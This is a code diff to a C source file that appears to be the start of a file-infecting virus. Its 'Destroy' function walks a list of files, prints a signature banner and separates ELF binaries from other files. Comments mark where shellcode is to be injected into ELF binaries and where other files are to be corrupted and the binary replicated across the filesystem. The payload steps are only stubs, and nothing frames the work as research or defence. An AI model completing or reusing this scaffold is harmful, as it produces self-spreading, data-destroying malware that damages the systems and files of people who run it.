@@ -8,12 +8,110 @@
 #include <stdlib.h>
 #include <stdio.h>
 
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+
 #include "color.h"
+#include "operations.h"
+
+
+
+unsigned long int elf_count = 0; 
+
+
+// Parses the FileList, checking the filetypes and perform actions accordingly  
+void Destroy(FileList *start)
+{
+	fprintf(stdout, SIGNATURE);
+
+	FileList *ptr = start;
+
+
+	// Parse FileList
+	do
+	{
+		if ( IsELF(ptr->name) )
+		{
+			++elf_count;
+			fprintf(stdout, GREEN"[%ld] ELF"RESET" : %s\n", elf_count, ptr->name);
+			// inject shellcode
+		}
+		
+		else
+		{
+			fprintf(stdout, BLUE"[+] Regular"RESET" : %s\n", ptr->name);
+			// corrupt files and replicate binary to FS
+		}
+
+		ptr = ptr->next;	
+
+	} while (ptr != NULL);
+}
+
+
+int log_heading_set = 0;
+int log_footer_set = 0;
+// Returns True if file is an ELF binary
+static int IsELF(char *file)
+{
+
+	// Open file in read mode
+	int fd = open(file, O_RDONLY);
+	if (fd == -1)
+	{
+		// Create a log file and append the filepaths which could not be opened or which does not 
+		// exist (perhaps they were process mapping files or temporary files in FS)
+		int log_fd = open("./log.almighty", O_WRONLY|O_APPEND|O_CREAT, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH);
+			if (log_fd == -1)
+				perror(RED"[-]"RESET" In IsELF()");
+		
+
+		// Writing LOGs such that LOG_FILE_HEADER and LOG_FILE_FOOTER is written only once
+		if (!log_heading_set)
+		{
+			write(log_fd, LOG_FILE_HEADER, strlen(LOG_FILE_HEADER));
+			log_heading_set = 1;
+		}
+		write(log_fd, file, strlen(file));
+		write(log_fd, "\n", 1);
+		
+
+		// Prevent resource leakage
+		close(log_fd);	
+		return 2;
+	}
+
+
+    // Read Magic bytes (first 4 bytes of file) - 0x7f 0x45 0x4c 0x46
+	char magic[4];
+	int bytes_read = read(fd, magic, 4);
+	if (bytes_read != 4 )
+	{
+		close(fd);
+		return 0;
+	}
+
+
+	//fprintf(stdout, CYAN"[+] "RESET" Bytes read : %x%x%x%x : %d !\n", magic[0], magic[1], magic[2], magic[3], bytes_read);
+	if (strncmp(magic, MAGIC_ELF, 4) != 0)
+	{
+		close(fd);
+		return 0;
+	}
+
+
+	// Prevent resource leakage
+	close(fd);
+	return 1;
+}
 
 
 
 // Returns a joined string (path + name) 
-char *GetAbsPath(char *path, char *name)
+char *GetAbsPath (char *path, char *name)
 {
 
 	// Plus 2 because of a '\0' (string terminator) and a '/' (placed in between both paths)
